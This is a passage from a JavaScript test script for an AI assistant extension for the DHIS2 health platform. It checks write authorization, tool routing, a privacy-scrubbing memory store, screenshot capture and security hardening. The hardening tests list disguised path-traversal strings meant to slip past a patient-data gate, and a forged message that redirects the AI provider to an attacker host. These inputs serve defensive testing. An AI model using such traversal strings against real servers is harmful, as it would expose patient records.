    const iconKeys = block(/const iconMap = \{([\s\S]*?)\n\s*\};/, 'iconMap');
    const labelKeys = block(/const toolLabels = \{([\s\S]*?)\n\s*\};/, 'toolLabels');
    const detailKeys = new Set(
      [...panelSrc.matchAll(/tool === '(\w+)'/g)].map((m) => m[1]));
    if (!router || typeof router !== 'object') {
      bad('TOOL_ROUTER not exposed to the verifier');
    } else {
      const names = Object.keys(router);
      const missing = (set, what) => {
        if (!set) return;
        const gaps = names.filter((n) => !set.has(n));
        if (gaps.length) bad(`${what} is missing: ${gaps.join(', ')}`);
        else ok(`${what} covers all ${names.length} routable tools`);
      };
      missing(iconKeys, 'panel iconMap');
      missing(labelKeys, 'panel toolLabels');
      // render_chart is matched via an `isChart` flag, not a `tool ===` test,
      // and dhis2_query's args.path fallback is already meaningful.
      const detailExempt = new Set(['render_chart']);
      const detailGaps = names.filter((n) => !detailKeys.has(n) && !detailExempt.has(n));
      if (detailGaps.length) bad(`panel detail formatter has no branch for: ${detailGaps.join(', ')}`);
      else ok(`panel detail formatter covers all ${names.length} routable tools`);
    }
  }

  const missingTarget = need('actionMissingFieldTarget');
  if (missingTarget) {
    eq('HIDEFIELD with no target is refused', missingTarget('HIDEFIELD', {}), true);
    eq('HIDEFIELD with a DE passes', missingTarget('HIDEFIELD', { dataElement: { id: 'x' } }), false);
    eq('SETMANDATORYFIELD with a TEA passes', missingTarget('SETMANDATORYFIELD', { trackedEntityAttribute: { id: 'x' } }), false);
    eq('ASSIGN to a variable via content passes', missingTarget('ASSIGN', { content: '#{v}' }), false);
    eq('ASSIGN with no target and no content is refused', missingTarget('ASSIGN', {}), true);
    eq('HIDEOPTION without the option is refused', missingTarget('HIDEOPTION', { dataElement: { id: 'x' } }), true);
    eq('HIDEOPTION with option + DE passes', missingTarget('HIDEOPTION', { dataElement: { id: 'x' }, option: { id: 'o' } }), false);
    eq('SHOWWARNING without a DE still passes (legal)', missingTarget('SHOWWARNING', {}), false);
  }
}

// ── Administration tools (src/tools-admin.js) + 2026-10-20 fixes ──────────────
if (loaded) {
  console.log('\nAdministration tools & 2026-10-20 fixes:');
  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
  const eq = (label, got, want) => {
    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
  };
  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing`); return f; };

  // Imperative write verbs authorize; the same verbs inside a complaint do not.
  const cwa = need('classifyWriteAuthorization');
  if (cwa) {
    eq('"Enter 12 malaria cases for January…" authorizes', cwa('Enter 12 malaria cases for January 2026 at Agouza').scope, 'broad');
    eq('"Reset Jane\'s password…" authorizes', cwa("Reset Jane's password to Abc12345!").scope, 'broad');
    eq('"please mark the September form complete" authorizes', cwa('please mark the September form complete').scope, 'broad');
    eq('"When I enter data and then submit the form it fails" stays read_only', cwa('When I enter data and then submit the form it fails').scope, 'read_only');
    eq('"If I mark it complete the values disappear" stays read_only', cwa('If I mark it complete the values disappear').scope, 'read_only');
    eq('"why can\'t I enter values?" stays read_only', cwa("why can't I enter values?").scope, 'read_only');
  }

  // Rule-action key aliases land on the canonical keys.
  const nra = need('normalizeRuleActionAliases');
  if (nra) {
    const a1 = nra({ type: 'HIDEFIELD', data_element: 'Sample ID' });
    eq('data_element:"Sample ID" → data_element_name', a1.data_element_name, 'Sample ID');
    const a2 = nra({ action_type: 'SHOWWARNING', dataElement: { id: 'a3kGcGpz8FJ' }, message: 'Low' });
    eq('dataElement:{id} → data_element_id (+type, +content)', [a2.data_element_id, a2.type, a2.content], ['a3kGcGpz8FJ', 'SHOWWARNING', 'Low']);
    const a3 = nra({ type: 'SETMANDATORYFIELD', attribute: 'National ID' });
    eq('attribute:"National ID" → tracked_entity_attribute_name', a3.tracked_entity_attribute_name, 'National ID');
    const a4 = nra({ type: 'HIDEFIELD', data_element_name: 'Keep me', data_element: 'Not me' });
    eq('an explicit canonical key is never overwritten', a4.data_element_name, 'Keep me');
    const a5 = nra({ type: 'HIDEFIELD', field: 'Temperature' });
    eq('UID-shaped English word "Temperature" stays a NAME', [a5.data_element_name, a5.data_element_id], ['Temperature', undefined]);
  }
  const cat = need('canonicalizeActionTargetNames');
  if (cat) {
    const act = { data_element_name: 'national id' };
    cat(act, ['Weight'], ['National ID']);
    eq('a TEA name given as data_element_name moves to the attribute key', [act.tracked_entity_attribute_name, act.data_element_name], ['National ID', undefined]);
  }

  // Routing: metadata translation vs app-UI translation are disjoint.
  // (Fresh thread — the sticky-tool checks above left tools "used".)
  try { ctx.__dhis2().toolsUsedThisThread = []; } catch { /* older bundle */ }
  const gct = need('getContextualTools');
  if (gct) {
    const names = (ctxObj, text) => gct(ctxObj, text, false, null).map((t) => t.function.name);
    let n = names({ appType: 'Maintenance' }, 'translate the TB program and its data elements into French');
    eq('"translate the TB program…" → manage_metadata_translations', n.includes('manage_metadata_translations'), true);
    eq('…and NOT the app-UI string tool', n.includes('manage_custom_translations'), false);
    n = names({ appType: 'Capture' }, 'translate the Capture app buttons to Arabic');
    eq('"translate the Capture app buttons" → manage_custom_translations', n.includes('manage_custom_translations'), true);
    n = names({ appType: 'Dashboard' }, 'create a user account for Jane with the data entry role');
    eq('"create a user account…" → manage_users', n.includes('manage_users'), true);
    n = names({ appType: 'Dashboard' }, 'share this dashboard with all users');
    eq('"share … with all users" does NOT surface manage_users', n.includes('manage_users'), false);
    n = names({ appType: 'Aggregate Data Entry', datasetId: 'a3kGcGpz8FJ' }, 'what is missing here?');
    eq('Data Entry app → manage_data_values', n.includes('manage_data_values'), true);
    n = names({ appType: 'Dashboard' }, 'enter 12 malaria cases in the monthly dataset for January 2026 at Agouza');
    eq('"enter … monthly dataset … January" → manage_data_values', n.includes('manage_data_values'), true);
    n = names({ appType: 'Capture', programId: 'a3kGcGpz8FJ' }, 'enter a new event for this patient');
    eq('tracker data entry does NOT surface manage_data_values', n.includes('manage_data_values'), false);
  }

  // Aggregate value coercion / periods / disaggregation matching.
  const npi = need('normalizePeriodInput');
  if (npi) {
    eq('"January 2026" (Monthly) → 202601', npi('Monthly', 'January 2026'), '202601');
    eq('"2026-03" (Monthly) → 202603', npi('Monthly', '2026-03'), '202603');
    eq('"Q2 2026" (Quarterly) → 2026Q2', npi('Quarterly', 'Q2 2026'), '2026Q2');
    eq('"2026 week 3" (Weekly) → 2026W3', npi('Weekly', '2026 week 3'), '2026W3');
  }
  const po = need('periodOrdinal');
  if (po) eq('Monthly ordinal 202601 - 202512 = 1', po('Monthly', '202601') - po('Monthly', '202512'), 1);
  const cdv = need('coerceDataValue');
  if (cdv) {
    eq('INTEGER_ZERO_OR_POSITIVE "-2" refused', !!cdv({ valueType: 'INTEGER_ZERO_OR_POSITIVE' }, '-2').problem, true);
    eq('BOOLEAN "yes" → "true"', cdv({ valueType: 'BOOLEAN' }, 'yes').value, 'true');
    eq('option NAME → code', cdv({ valueType: 'TEXT', optionSet: { options: [{ code: 'LOW', displayName: 'Low' }] } }, 'low').value, 'LOW');
    eq('unknown option refused', !!cdv({ valueType: 'TEXT', optionSet: { options: [{ code: 'LOW', displayName: 'Low' }] } }, 'Plenty').problem, true);
    eq('NUMBER "1,250" → "1250"', cdv({ valueType: 'NUMBER' }, '1,250').value, '1250');
  }
  const mc = need('matchCoc');
  if (mc) {
    const cocs = [{ id: 'aaaaaaaaaa1', displayName: 'Female, <5', categoryOptions: [{ displayName: 'Female' }, { displayName: '<5' }] },
                  { id: 'aaaaaaaaaa2', displayName: 'Male, <5', categoryOptions: [{ displayName: 'Male' }, { displayName: '<5' }] }];
    eq('COC by option names in any order', (mc(cocs, '<5, Female') || {}).id, 'aaaaaaaaaa1');
    eq('COC by option array', (mc(cocs, ['<5', 'Male']) || {}).id, 'aaaaaaaaaa2');
    eq('"Female, 5+" does NOT match "Female, <5" (symbols kept)', mc(cocs, 'Female, 5+'), null);
    const ages = [{ id: 'bbbbbbbbbb1', displayName: '<5', categoryOptions: [{ displayName: '<5' }] }, { id: 'bbbbbbbbbb2', displayName: '5+', categoryOptions: [{ displayName: '5+' }] }];
    eq('"5+" resolves to the 5+ band', (mc(ages, '5+') || {}).id, 'bbbbbbbbbb2');
    eq('"<5" resolves to the <5 band', (mc(ages, '<5') || {}).id, 'bbbbbbbbbb1');
  }
  const hdv = need('hardenDataValueSetsPath');
  if (hdv) {
    eq('raw dataValueSets import gets strictPeriods', /strictPeriods=true/.test(hdv('dataValueSets')), true);
    eq('explicit strictPeriods=false is respected', /strictPeriods=false/.test(hdv('dataValueSets?strictPeriods=false')), true);
    eq('DELETE strategy left untouched', hdv('dataValueSets?importStrategy=DELETE'), 'dataValueSets?importStrategy=DELETE');
  }

  // Users: password policy + username shape.
  const cp = need('checkPassword');
  if (cp) {
    eq('"Abc12345!" passes the policy', cp('Abc12345!', { min: 8, max: 72 }).length, 0);
    eq('"Abcdefgh!" lacks a digit', cp('Abcdefgh!', { min: 8, max: 72 }).some((p) => /digit/.test(p)), true);
    const gp = need('generateStrongPassword');
    if (gp) eq('generated password satisfies the policy', cp(gp(14), { min: 8, max: 72 }).length, 0);
  }
  const cu = need('checkUsername');
  if (cu) { eq('"zz_ok-name.1" is a valid username', cu('zz_ok-name.1'), null); eq('"Bad Name" refused', !!cu('Bad Name'), true); }

  // Indicator types by factor.
  const iif = need('impliedIndicatorFactor');
  if (iif) {
    eq('"Per cent" → factor 100', (iif('Per cent') || {}).factor, 100);
    eq('"%" → factor 100', (iif('%') || {}).factor, 100);
    eq('"per 100,000" → factor 100000', (iif('per 100,000') || {}).factor, 100000);
    eq('"Number (Factor 1)" → factor 1', (iif('Number (Factor 1)') || {}).factor, 1);
  }

  // Aggregate-data delete block → data-pruning hint names the right UID.
  const adh = need('aggregateDataBlockHint');
  if (adh) eq('hint carries the DE UID from a metadata DELETE body', /dataPruning\/dataElements\/Sdn2X0UkIQL/.test(adh('metadata?importStrategy=DELETE {"dataElements":[{"id":"Sdn2X0UkIQL"}]}')), true);
}

// ── Learning memory (src/memory.js) ──────────────────────────────────────────
// Async block: every await below resolves on the microtask queue, which drains
// before the setImmediate verdict.
if (loaded) (async () => {
  console.log('\nLearning memory:');
  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
  const eq = (label, got, want) => {
    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
  };
  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing`); return f; };
  const st = ctx.__memoryState && ctx.__memoryState();
  if (!st) { bad('memoryState not exposed'); return; }
  await ctx.ensureMemoryLoaded();
  st.entries = [];
  st.enabled = true;

  // Scrubbing: identifiers and personal values never reach storage.
  const scrub = need('scrubMemoryText');
  if (scrub) {
    eq('UIDs → <uid>', scrub('tracker/trackedEntities/a3kGcGpz8FJ failed for CcHoHIzjuVo'), 'tracker/trackedEntities/<uid> failed for <uid>');
    eq('API words like programType survive', scrub('set programType and periodTypes'), 'set programType and periodTypes');
    eq('e-mail → <email>', scrub('sent to jane.doe@moh.gov.sl'), 'sent to <email>');
    eq('phone → <number>', scrub('call +232 76 123 456'), 'call <number>');
    eq('dates → <date>', scrub('born 1990-04-12'), 'born <date>');
    eq('filter values → <value>', scrub('GET trackedEntities?filter=w75KJ2mc4zz:eq:Fatmata'), 'GET trackedEntities?filter=<uid>:eq:<value>');
    eq('monthly period id survives, long ids do not', scrub('period 202601 id 12345678'), 'period 202601 id <number>');
    eq('server URL reduced to path', scrub('https://play.dhis2.org/api/42/dashboards/abc?x=1'), '/api/dashboards/abc?x=1');
  }
  const personal = need('looksLikePersonalData');
  if (personal) {
    eq('"patient named Fatmata" is personal', personal('the patient named Fatmata could not enroll'), true);
    eq('"Mrs Kamara" is personal', personal('record of Mrs Kamara'), true);
    eq('"first name: Ali" is personal', personal('first name: Ali'), true);
    eq('an API lesson is not personal', personal('PATCH users/<uid> /userGroups returns 500; use userGroups/<g>/users/<u>'), false);
  }

  // Recording through the tool: validation, privacy refusal, merge.
  const mm = need('executeManageMemory');
  if (mm) {
    let r = await mm({ action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'Add tiles with add_items, never PUT the dashboard', problem: 'A PUT dashboards/<uid> with only the new item wiped every existing tile.', solution: 'Use manage_dashboards(action="add_items", dashboard_id, items=[{visualization_id}]) — it appends and snapshots first.' });
    truthy('record a dashboard lesson', r.success && r.id);
    r = await mm({ action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'Use add_items to add tiles, never PUT the dashboard', problem: 'PUT dashboards wiped every existing tile', solution: 'manage_dashboards add_items appends safely.' });
    eq('a near-duplicate lesson MERGES (no second entry)', [r.merged_with_existing, st.entries.length], [true, 1]);
    r = await mm({ action: 'record', area: 'tracker_data', title: 'Enrollment for the patient named Fatmata fails', solution: 'Use a different date for Fatmata Kamara please' });
    truthy('a lesson with personal data is REFUSED', r._error && /personal/.test(r._error));
    await mm({ action: 'record', area: 'indicators', tools: ['manage_indicators'], title: 'Percent indicator type is named Percentage here', problem: 'indicator_type "Per cent" does not exist on this server', solution: 'Pass indicator_type:"Percentage" (factor 100) for percentages.', scope: 'instance' });
    await mm({ action: 'record', area: 'line_lists', tools: ['manage_line_lists'], title: 'Line list PI columns must not divide', problem: 'A division PI as a column was refused', solution: 'Use a row-safe SUM program indicator as the column.' });
    eq('three distinct lessons stored', st.entries.length, 3);
  }

  // Retrieval is task-aware.
  const block = need('buildMemoryPromptBlock');
  if (block) {
    const txt = block('create an ANC coverage indicator as a percentage then put it on a dashboard', ['manage_indicators', 'manage_dashboards', 'dhis2_query']);
    truthy('prompt block carries the indicator lesson', /Percentage/.test(txt));
    truthy('prompt block carries the dashboard lesson', /add_items/.test(txt));
    truthy('prompt block leaves out the unrelated line-list lesson', !/division PI/.test(txt));
    const none = block('how many enrollments last month?', ['count_records', 'dhis2_query']);
    truthy('an unrelated request gets no lessons (just the search pointer)', !/add_items|Percentage/.test(none));
  }
  const lf = need('memoryLessonsFor');
  if (lf) {
    const l = lf({ tool: 'manage_dashboards', args: { action: 'add_items' }, userText: 'add a chart' });
    truthy('manual-gate lessons for manage_dashboards found', l.length === 1 && /add_items/.test(l[0]));
  }

  // Automatic capture: failure → fix in one turn becomes a lesson.
  const begin = need('memoryBeginTurn'), observe = need('memoryObserveCall'), end = need('memoryEndTurn');
  if (begin && observe && end) {
    const before = st.entries.length;
    begin('create an indicator', { appType: 'Maintenance' }, new Set(['manage_indicators', 'manage_memory']));
    observe('manage_indicators', { action: 'create', indicator: { name: 'X', indicator_type: 'Per thousand', numerator: '#{a}', denominator: '#{b}' } },
      { _error: 'No indicatorType named "Per thousand".', _hint: 'Use one of this instance\'s types: "Percentage" (factor 100).' });
    const o = observe('manage_indicators', { action: 'create', indicator: { name: 'X', indicator_type: 'Percentage', numerator: '#{a}', denominator: '#{b}' } }, { success: true, indicator_id: 'a3kGcGpz8FJ' });
    truthy('recovery nudges the model to record the lesson', o.note && /manage_memory/.test(o.note));
    await end();
    const auto = st.entries.find(e => e.source === 'auto');
    eq('an automatic lesson was written', st.entries.length, before + 1);
    truthy('…naming the exact change (indicator_type Per thousand → Percentage)', auto && /indicator_type: Per thousand → Percentage/.test(auto.solution));
    truthy('…without the indicator NAME or expression values', auto && !/#\{a\}/.test(JSON.stringify(auto)));

    // Gate refusals are not lessons.
    const n1 = st.entries.length;
    begin('delete it', { appType: 'Maintenance' }, new Set());
    observe('manage_metadata', { action: 'delete' }, { _error: 'Refused: not authorized', _scope: 'requires_user_confirmation' });
    observe('manage_metadata', { action: 'delete' }, { success: true });
    await end();
    eq('write-auth refusals never become lessons', st.entries.length, n1);

    // Privacy taint: a turn that touched patient records writes NOTHING.
    begin('fix the enrollment', { appType: 'Capture', teiId: 'a3kGcGpz8FJ', programId: 'CcHoHIzjuVo' }, new Set(['manage_memory']));
    truthy('a patient-record page taints the turn', !!ctx.__memoryTurn().taint);
    observe('create_metadata', { action: 'add_stage' }, { _error: 'E4000 missing name' });
    observe('create_metadata', { action: 'add_stage' }, { success: true });
    const refused = await mm({ action: 'record', area: 'programs', title: 'Stages need a name always', solution: 'Always send the stage name field.' });
    await end();
    eq('tainted turn: no automatic lesson', st.entries.length, n1);
    truthy('tainted turn: manage_memory(record) refused', refused._error && /patient-level/.test(refused._error));
    begin('list people', { appType: 'Maintenance' }, new Set());
    observe('dhis2_query', { path: 'tracker/trackedEntities?program=CcHoHIzjuVo' }, { _error: 'Refused by hard privacy safeguard', _privacy_block: true });
    truthy('a patient-data read attempt taints the turn', !!ctx.__memoryTurn().taint);
    await end();
    begin('create a person', { appType: 'Maintenance' }, new Set());
    observe('dhis2_query', { path: 'tracker?async=false', method: 'POST', body: { trackedEntities: [] } }, { success: true });
    truthy('a tracker WRITE taints the turn', !!ctx.__memoryTurn().taint);
    await end();
  }

  // "remember …" in the USER's words makes the recorded lesson a user rule.
  if (mm) {
    vm.runInContext('lastUserText = "Please remember for the future: always use LAST_12_MONTHS on charts";', ctx);
    let r = await mm({ action: 'record', area: 'visualizations', tools: ['manage_dashboards'], title: 'Charts always use LAST_12_MONTHS here', solution: 'Set periods ["LAST_12_MONTHS"] on every chart.' });
    eq('"remember …" from the user → source user (user rule)', r.lesson && r.lesson.source, 'user');
    vm.runInContext('lastUserText = "make a chart of malaria";', ctx);
    r = await mm({ action: 'record', area: 'maps', tools: ['manage_maps'], title: 'Maps need an org unit level for districts', solution: 'Pass org_unit_level 2 for districts on this hierarchy.' });
    eq('a self-learned lesson stays source assistant', r.lesson && r.lesson.source, 'assistant');
  }

  // Search tool + on/off switch.
  if (mm) {
    const r = await mm({ action: 'search', query: 'dashboard tiles wiped' });
    truthy('search finds the dashboard lesson', r.success && r.lessons?.[0]?.area === 'dashboards');
  }
  const gct = fn('getContextualTools');
  if (gct) {
    truthy('manage_memory is offered while memory is ON', gct({ appType: 'Dashboard' }, 'make a chart', false).some(t => t.function.name === 'manage_memory'));
    st.enabled = false;
    truthy('manage_memory is withheld while memory is OFF', !gct({ appType: 'Dashboard' }, 'make a chart', false).some(t => t.function.name === 'manage_memory'));
    eq('no prompt block while memory is OFF', block ? block('put it on a dashboard', ['manage_dashboards']) : '', '');
    begin && begin('x', {}, new Set());
    const n2 = st.entries.length;
    observe && observe('manage_indicators', { action: 'create' }, { _error: 'boom' });
    observe && observe('manage_indicators', { action: 'create' }, { success: true });
    end && await end();
    eq('nothing is learned while memory is OFF', st.entries.length, n2);
    st.enabled = true;
  }
  st.entries = [];
})().catch((e) => bad(`learning-memory checks threw: ${e && e.stack || e}`));

// ── Screenshot capture (src/agent.js) ────────────────────────────────────────
// The manifest declares neither activeTab nor <all_urls>, so captureVisibleTab
// is refused: the background must hand capture to the injected overlay, which
// executeScript SERIALIZES — it may only use what it defines itself, so it runs
// here from its source text in a fresh context with a minimal DOM. Microtask-
// only (no real timers), like the block above. A handler that never answers
// would leave this block pending forever, so the verdict also checks it finished.
let screenshotChecksDone = false;
if (loaded) (async () => {
  console.log('\nScreenshot capture (no activeTab / <all_urls>):');
  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
  const flush = async () => { for (let i = 0; i < 50; i++) await Promise.resolve(); };
  const listener = messageListeners[0];
  if (!listener || typeof ctx.injectedScreenshotSelection !== 'function') { bad('screenshot handler / injectedScreenshotSelection missing'); return; }

  // Background message handling.
  const sent = [];
  chrome.runtime.sendMessage = (m) => { sent.push(m); return Promise.resolve(); };
  const fromTab = { id: 'verify', tab: { id: 7, windowId: 1 } };
  const call = (msg, sender = fromTab) => new Promise((resolve) => {
    if (listener(msg, sender, resolve) !== true) resolve(undefined);
  });
  chrome.tabs.captureVisibleTab = () => Promise.reject(new Error("Either the '<all_urls>' or 'activeTab' permission is required."));
  const r = await call({ type: 'SCREENSHOT_AREA_SELECTED', payload: { x: 1, y: 1, width: 50, height: 50, devicePixelRatio: 1 } });
  truthy('captureVisibleTab refused → overlay told to capture in-page', r && r.captureInPage === true);
  truthy('…with no error shown for the refused fast path', !sent.length);
  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' });
  truthy('in-page PNG is relayed to the panel as SCREENSHOT_RESULT', sent.length === 1 && sent[0].type === 'SCREENSHOT_RESULT');
  sent.length = 0;
  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:text/html;base64,PGI+' });
  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' }, { id: 'verify' });
  truthy('non-PNG data / a sender that is not a tab is dropped', !sent.length);
  await call({ type: 'SCREENSHOT_FAILED', reason: 'NotAllowedError', error: 'Permission denied' });
  truthy('cancelled share prompt → SCREENSHOT_ERROR (not AI_ERROR, which ends a streaming reply) naming Allow',
    sent[0]?.type === 'SCREENSHOT_ERROR' && /Allow/.test(sent[0].error));
  delete chrome.runtime.sendMessage;
  delete chrome.tabs.captureVisibleTab;

  // The injected overlay, from its serialized source.
  const src = ctx.injectedScreenshotSelection.toString();
  const page = ({ activation = true, response = { captureInPage: true }, getDisplayMedia } = {}) => {
    const msgs = [];
    const t = { stopped: false, gdmCalls: 0, overlayGoneAtCapture: null, drawn: null };
    const el = (tag) => {
      const e = {
        tag, id: '', style: {}, children: [], listeners: {},
        addEventListener(type, f) { (this.listeners[type] ||= []).push(f); },
        appendChild(c) { this.children.push(c); c.parent = this; },
        remove() { if (this.parent) this.parent.children = this.parent.children.filter((x) => x !== this); },
        fire(type, ev = {}) { for (const f of this.listeners[type] || []) f({ preventDefault: noop, ...ev }); },
      };
      if (tag === 'video') e.play = async () => { e.videoWidth = 2000; e.videoHeight = 1488; };
      if (tag === 'canvas') {
        e.getContext = () => ({ drawImage: (...a) => { t.drawn = a.slice(1); } });
        e.toDataURL = () => 'data:image/png;base64,QUJD';
      }
      return e;
    };
    const body = el('body');
    const track = { getSettings: () => ({ displaySurface: 'browser' }), stop: () => { t.stopped = true; } };
    const gdm = getDisplayMedia || (async () => {
      t.gdmCalls++;
      t.overlayGoneAtCapture = !body.children.length;
      return { getVideoTracks: () => [track], getTracks: () => [track] };
    });
    const win = {
      document: { body, createElement: el, getElementById: (id) => body.children.find((c) => c.id === id) || null, addEventListener: noop, removeEventListener: noop },
      innerWidth: 1000, innerHeight: 800, devicePixelRatio: 2,
      navigator: { userActivation: { isActive: activation }, mediaDevices: getDisplayMedia === null ? undefined : { getDisplayMedia: gdm } },
      chrome: { runtime: { sendMessage: (m) => { msgs.push(m); return Promise.resolve(m.type === 'SCREENSHOT_AREA_SELECTED' ? response : undefined); } } },
      setTimeout: (f) => Promise.resolve().then(f),
    };
    win.window = win;
    vm.runInContext(`(${src})()`, vm.createContext(win));
    const overlay = body.children[0];
    const drag = () => {
      overlay.fire('mousedown', { clientX: 100, clientY: 50 });
      overlay.fire('mousemove', { clientX: 300, clientY: 200 });
      overlay.fire('mouseup', { clientX: 400, clientY: 250 });
    };
    return { t, msgs, body, drag };
  };

  let p = page();
  p.drag();
  await flush();
  truthy('overlay is self-contained: runs from its serialized source', p.msgs.some((m) => m.type === 'SCREENSHOT_AREA_SELECTED'));
  truthy('in-page capture starts only after the overlay is removed', p.t.gdmCalls === 1 && p.t.overlayGoneAtCapture === true);
  truthy('crop maps CSS px → frame px by width (DPR 2: 100,50 300×200 → 200,100 600×400)',
    JSON.stringify(p.t.drawn) === JSON.stringify([200, 100, 600, 400, 0, 0, 600, 400]));
  truthy('cropped PNG sent as SCREENSHOT_CAPTURED and the stream stopped',
    p.msgs.some((m) => m.type === 'SCREENSHOT_CAPTURED' && m.dataUrl === 'data:image/png;base64,QUJD') && p.t.stopped);

  p = page({ response: { ok: true } });
  p.drag();
  await flush();
  truthy('prompt-free path succeeded → no tab-capture prompt', p.t.gdmCalls === 0);

  p = page({ activation: false });
  p.drag();
  await flush();
  const btn = p.body.children.find((c) => c.id === '__dhis2_screenshot_confirm__');
  truthy('expired user activation (slow drag) → "Capture selection" button, no prompt yet', btn && p.t.gdmCalls === 0);
  btn && btn.fire('click');
  await flush();
  truthy('…clicking it captures and removes the button', p.t.gdmCalls === 1 && !p.body.children.length);

  p = page({ getDisplayMedia: async () => { throw Object.assign(new Error('Permission denied'), { name: 'NotAllowedError' }); } });
  p.drag();
  await flush();
  truthy('cancelled prompt → SCREENSHOT_FAILED NotAllowedError', p.msgs.some((m) => m.type === 'SCREENSHOT_FAILED' && m.reason === 'NotAllowedError'));

  p = page({ getDisplayMedia: null });
  p.drag();
  await flush();
  truthy('insecure context (no mediaDevices) → SCREENSHOT_FAILED InsecureContextError', p.msgs.some((m) => m.type === 'SCREENSHOT_FAILED' && m.reason === 'InsecureContextError'));
  screenshotChecksDone = true;
})().catch((e) => { screenshotChecksDone = true; bad(`screenshot checks threw: ${e && e.stack || e}`); });

// ── Security & navigation hardening (core.js / providers.js / agent.js) ─────
// Microtask-only, like the blocks above; the verdict checks it finished.
let hardeningChecksDone = false;
if (loaded) (async () => {
  console.log('\nSecurity & navigation hardening:');
  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
  const flush = async () => { for (let i = 0; i < 50; i++) await Promise.resolve(); };

  // Disguised paths: fetch() resolves these into a different endpoint than the
  // string every gate inspected (live on 2.42: 7 forms read patient rows).
  const amb = ctx.ambiguousApiPathReason;
  const disguised = ['programs/../tracker/trackedEntities', './tracker/events', 'programs/%2e%2e/tracker/events',
    'programs/.%2E/tracker/events', 'tracker/%74rackedEntities', 'tracker\\trackedEntities', 'tracker/events#', 'tracker;x=1/events'];
  truthy('every disguised path form is refused', disguised.every((p) => amb(p)));
  const plain = ['programs/a3kGcGpz8FJ?fields=id,programStages[id,name]', 'tracker/events.json?program=a3kGcGpz8FJ',
    'dataStore/dhis2-ai-backups/key%20with%20space', 'analytics?dimension=dx:a3kGcGpz8FJ;b3kGcGpz8FJ&filter=pe:LAST_12_MONTHS',
    'programIndicators/expression/description?expression=%23%7Bx%7D', 'metadata?importMode=VALIDATE'];
  truthy('plain API paths (incl. ; and # in the QUERY, %20 in a key) are untouched', plain.every((p) => !amb(p)));
  const d = ctx.__dhis2();
  const saved = { baseUrl: d.baseUrl, apiVersion: d.apiVersion };
  d.baseUrl = 'http://localhost:8081'; d.apiVersion = '42';
  const r1 = await ctx.__realSafeDhis2Fetch('programs/../tracker/trackedEntities?program=a3kGcGpz8FJ');
  truthy('safeDhis2Fetch refuses a disguised path before any request', r1 && r1._refused_path === true);
  let threw = false;
  try { ctx.apiUrl('trackedEntityTypes/%2e%2e/tracker/enrollments'); } catch { threw = true; }
  truthy('apiUrl refuses a disguised path', threw);
  Object.assign(d, saved);

  // Privacy gate on its own: canonical path + boundary.
  const prd = ctx.pathReadsPatientData;
  truthy('gate sees through ../, ./, %2e, %74, backslash and #',
    ['programs/../tracker/trackedEntities', './tracker/events', 'x/%2e%2e/tracker/enrollments', 'tracker/%74rackedEntities',
     'tracker\\events', 'tracker/events#', 'programs/x/../../tracker/relationships?x=1', '/api/42/tracker/events.csv'].every(prd));
  truthy('gate does not over-block metadata / aggregate paths',
    !['programs/../dataElements', 'eventReports', 'eventVisualizations?fields=id', 'analytics/events/aggregate/a3kGcGpz8FJ', 'trackedEntityTypes', 'trackedEntityInstanceFilters'].some(prd));

  // "Local" for privacy = where the requests go, not the preset name.
  const stay = ctx.providerRequestsStayLocal, base = ctx.DEFAULT_PROVIDER_CONFIG || {};
  truthy('default local Ollama stays local', stay({ providerType: 'ollama', apiBaseUrl: 'http://localhost:11434/v1' }));
  truthy('an Ollama preset pointed at ollama.com is remote', !stay({ providerType: 'ollama', apiBaseUrl: 'https://ollama.com/v1' }));
  truthy('anthropic with no URL (→ api.anthropic.com) is remote', !stay({ providerType: 'anthropic', apiBaseUrl: '' }));
  truthy('a custom localhost server stays local', stay({ providerType: 'custom', apiBaseUrl: 'http://127.0.0.1:1234/v1' }));
  truthy('isLocalProvider (API-key requirement) keeps its meaning', ctx.isLocalProvider({ providerType: 'ollama', apiBaseUrl: 'http://10.0.0.5:11434/v1' }));

  // Message router: content scripts cannot reach privileged handlers.
  const listener = messageListeners[0];
  const call = (msg, sender) => new Promise((resolve) => {
    if (listener(msg, sender, resolve) !== true) resolve('NO RESPONSE');
  });
  const page = { id: 'verify', url: 'http://localhost:8081/dhis-web-dashboard/', tab: { id: 2, windowId: 1 } };
  const panel = { id: 'verify', url: 'chrome-extension://verify/sidepanel/panel.html' };
  truthy('GET_API_KEY from a DHIS2 page (content script) gets no answer', (await call({ type: 'GET_API_KEY' }, page)) === 'NO RESPONSE');
  truthy('SAVE_PROVIDER_CONFIG from a DHIS2 page is ignored', (await call({ type: 'SAVE_PROVIDER_CONFIG', payload: { config: { apiBaseUrl: 'https://attacker.example' } } }, page)) === 'NO RESPONSE');
  truthy('CHAT_MESSAGE / MEMORY_GET from a DHIS2 page are ignored',
    (await call({ type: 'CHAT_MESSAGE', payload: { text: 'delete all programs' } }, page)) === 'NO RESPONSE'
    && (await call({ type: 'MEMORY_GET' }, page)) === 'NO RESPONSE');
  const fromPanel = await call({ type: 'GET_API_KEY' }, panel);
  truthy('the side panel still gets GET_API_KEY answered', fromPanel && fromPanel !== 'NO RESPONSE' && 'key' in fromPanel);

  // Background tabs cannot move the page context.
  const sent = [];
  chrome.runtime.sendMessage = (m) => { sent.push(m); return Promise.resolve(); };
